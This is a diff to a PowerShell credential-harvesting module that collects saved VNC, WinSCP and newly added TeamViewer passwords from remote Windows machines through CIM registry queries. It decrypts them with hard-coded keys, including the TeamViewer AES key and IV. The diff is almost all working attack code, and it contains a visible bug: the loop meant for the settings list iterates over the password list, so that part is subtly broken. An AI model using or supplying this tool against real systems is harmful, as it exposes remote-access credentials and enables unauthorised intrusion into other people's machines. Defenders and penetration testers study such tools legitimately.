@@ -1,6 +1,6 @@
 #requires -version 3
 
-function Get-CredentialRegistry {
+Function Get-CredentialRegistry {
 <#
 .SYNOPSIS
     Get credentials from registry keys located on a remote computer.
@@ -96,6 +96,7 @@ function Get-CredentialRegistry {
         # Common credential registry keys
 
         Get-VncCredentialRegistry -CimSession $cimSession
+        Get-TeamViewerCredentialRegistry -CimSession $cimSession
 
         # User credential registry keys
 
@@ -103,6 +104,7 @@ function Get-CredentialRegistry {
         $SIDS = Invoke-CimMethod -Class 'StdRegProv' -Name 'EnumKey' -Arguments @{hDefKey=$HKU; sSubKeyName=''} -CimSession $cimSession -Verbose:$false | Select-Object -ExpandProperty sNames | Where-Object {$_ -match 'S-1-5-21-[\d\-]+$'}
         foreach ($SID in $SIDs) {
             Get-VncCredentialRegistry -CimSession $cimSession -SID $SID
+            Get-TeamViewerCredentialRegistry -CimSession $cimSession -SID $SID
             Get-WinScpCredentialRegistry -CimSession $cimSession -SID $SID
         }
     }
@@ -112,7 +114,7 @@ function Get-CredentialRegistry {
     }
 }
 
-function Local:Get-VncCredentialRegistry {
+Function Local:Get-VncCredentialRegistry {
     Param (
         [Parameter(Mandatory = $True)]
         [CimSession]
@@ -123,7 +125,7 @@ function Local:Get-VncCredentialRegistry {
     )
 
     BEGIN {
-        function Local:Get-VncDecryptedPassword ([byte[]] $EncryptedPassword) {
+        Function Local:Get-VncDecryptedPassword ([byte[]] $EncryptedPassword) {
             if ($EncryptedPassword.Length -lt 8) {
                 return ""
             }
@@ -147,7 +149,7 @@ function Local:Get-VncCredentialRegistry {
             return [Text.Encoding]::UTF8.GetString($des.CreateDecryptor($key, $null).TransformFinalBlock($EncryptedPassword, 0, $EncryptedPassword.Length));
         }
 
-        function Local:HexStringToByteArray ([string] $HexString) {    
+        Function Local:HexStringToByteArray ([string] $HexString) {    
             $byteArray = New-Object Byte[] ($HexString.Length/2);
             for ($i = 0; $i -lt $HexString.Length; $i += 2) {
                 $byteArray[$i/2] = [Convert]::ToByte($HexString.Substring($i, 2), 16)
@@ -206,7 +208,111 @@ function Local:Get-VncCredentialRegistry {
     END {}
 }
 
-function Local:Get-WinScpCredentialRegistry {
+Function Local:Get-TeamViewerCredentialRegistry {
+    Param (
+        [Parameter(Mandatory = $True)]
+        [CimSession]
+        $CimSession,
+
+        [String]
+        $SID
+    )
+
+    BEGIN {
+        Function Local:Create-AesManagedObject() {
+            $aesManaged = New-Object "System.Security.Cryptography.AesManaged"
+            $aesManaged.Mode = [Security.Cryptography.CipherMode]::CBC
+            $aesManaged.Padding = [Security.Cryptography.PaddingMode]::Zeros
+            $aesManaged.BlockSize = 128
+            $aesManaged.KeySize = 128
+            $aesManaged.IV = 0x01,0x00,0x01,0x00,0x67,0x24,0x4f,0x43,0x6e,0x67,0x62,0xf2,0x5e,0xa8,0xd7,0x04
+            $aesManaged.KEY = 0x06,0x02,0x00,0x00,0x00,0xa4,0x00,0x00,0x52,0x53,0x41,0x31,0x00,0x04,0x00,0x00
+            return $aesManaged
+        }
+
+        Function Local:Get-TeamViewerDecryptedPassword($encryptedBytes) {
+            $aesManaged = Create-AesManagedObject
+            $decryptor = $aesManaged.CreateDecryptor()
+            $unencryptedData = $decryptor.TransformFinalBlock($encryptedBytes, 0, $encryptedBytes.Length)
+            $aesManaged.Dispose()
+            return [Text.Encoding]::UTF8.GetString($unencryptedData)
+        }
+
+        $ComputerName = $CimSession.ComputerName
+    }
+
+    PROCESS {
+        $commonKeys = @(
+            "SOFTWARE\TeamViewer"
+            "SOFTWARE\WOW6432Node\TeamViewer"
+        )
+
+        $commonValues = @(
+            "LicenseKeyAES"
+            "OptionsPasswordAES"
+            "PermanentPassword"
+            "ProxyPasswordAES"
+            "ServerPasswordAES"
+            "SecurityPasswordAES"
+            "SecurityPasswordExported"
+        )
+
+        [uint32]$HKLM = 2147483650
+        [uint32]$HKU = 2147483651
+        $hive = $HKLM
+
+        foreach ($location in $commonKeys) {
+            if ($SID) {
+                $location = $SID + "\" + $location
+                $hive = $HKU
+            }
+            $subKeys = Invoke-CimMethod -Namespace 'root/default' -ClassName 'StdRegProv' -MethodName 'EnumKey' -Arguments @{hDefKey=$hive; sSubKeyName=$location} -CimSession $cimSession -Verbose:$false
+            foreach ($keyName in $subKeys.sNames) {
+                $commonKeys += "$location\$keyName".Trim('\')
+            }
+        }
+
+        foreach ($location in $commonKeys) {
+            if ($SID) {
+                $location = $SID + "\" + $location
+                $hive = $HKU
+            }
+
+            $creds = New-Object -TypeName psobject
+            $success = $False
+            foreach ($valueName in $commonValues) {
+                if ($value = (Invoke-CimMethod -Class 'StdRegProv' -Name 'GetBinaryValue' -Arguments @{hDefKey=$hive; sSubKeyName=$location; sValueName=$valueName} -CimSession $cimSession -Verbose:$false).uValue) {
+                    $creds | Add-Member -MemberType NoteProperty -Name $valueName -Value (Get-TeamViewerDecryptedPassword($value))
+                    $success = $True
+                }
+            }
+            if ($success) {
+                $settingValues = @(
+                    "BuddyLoginName"
+                    "OwningManagerAccountName"
+                    "Proxy_IP"
+                    "ProxyUsername"
+                )
+                foreach ($valueName in $commonValues) {
+                    if ($value = (Invoke-CimMethod -Class 'StdRegProv' -Name 'GetStringValue' -Arguments @{hDefKey=$hive; sSubKeyName=$location; sValueName=$valueName} -CimSession $cimSession -Verbose:$false).sValue) {
+                        $creds | Add-Member -MemberType NoteProperty -Name $valueName -Value $value
+                    }
+                }
+
+                $obj = New-Object -TypeName psobject
+                $obj | Add-Member -MemberType NoteProperty -Name 'ComputerName' -Value $ComputerName
+                $obj | Add-Member -MemberType NoteProperty -Name 'Type' -Value 'TeamViewer'
+                $obj | Add-Member -MemberType NoteProperty -Name 'Location' -Value $location
+                $obj | Add-Member -MemberType NoteProperty -Name 'Credential' -Value $creds
+                Write-Output $obj
+            }
+        }
+    }
+
+    END {}
+}
+
+Function Local:Get-WinScpCredentialRegistry {
     Param (
         [Parameter(Mandatory = $True)]
         [CimSession]
@@ -218,7 +324,7 @@ function Local:Get-WinScpCredentialRegistry {
     )
 
     BEGIN {
-        function Local:DecryptWinSCPPassword($SessionHostname, $SessionUsername, $Password) {
+        Function Local:Get-WinSCPDecryptedPassword($SessionHostname, $SessionUsername, $Password) {
             $CheckFlag = 255
             $Magic = 163
             $len = 0
@@ -237,15 +343,13 @@ function Local:Get-WinScpCredentialRegistry {
                 $values = (DecryptNextCharacterWinSCP($values.remainingPass))
                 $finalOutput += [char]$values.flag
             }
-
             if ($storedFlag -eq $CheckFlag) {
                 return $finalOutput.Substring($key.length)
             }
-
             return $finalOutput
         }
 
-        function Local:DecryptNextCharacterWinSCP($remainingPass) {
+        Function Local:DecryptNextCharacterWinSCP($remainingPass) {
             # Creates an object with flag and remainingPass properties
             $flagAndPass = "" | Select-Object -Property flag,remainingPass
             # Shift left 4 bits equivalent for backwards compatibility with older PowerShell versions
@@ -276,7 +380,7 @@ function Local:Get-WinScpCredentialRegistry {
                     $key = $SID + "\SOFTWARE\Martin Prikryl\WinSCP 2\Configuration\Security"
                     $masterPassUsed = (Invoke-CimMethod -Class 'StdRegProv' -Name 'GetDWordValue' -Arguments @{hDefKey=$HKU; sSubKeyName=$key; sValueName="UseMasterPassword"} -CimSession $cimSession -Verbose:$false).uValue
                     if (!$masterPassUsed) {
-                        $password = (DecryptWinSCPPassword $hostname $username $password)
+                        $password = (Get-WinSCPDecryptedPassword $hostname $username $password)
                         $obj = New-Object -TypeName psobject
                         $obj | Add-Member -MemberType NoteProperty -Name 'ComputerName' -Value $ComputerName
                         $obj | Add-Member -MemberType NoteProperty -Name 'Type' -Value 'WinSCP'
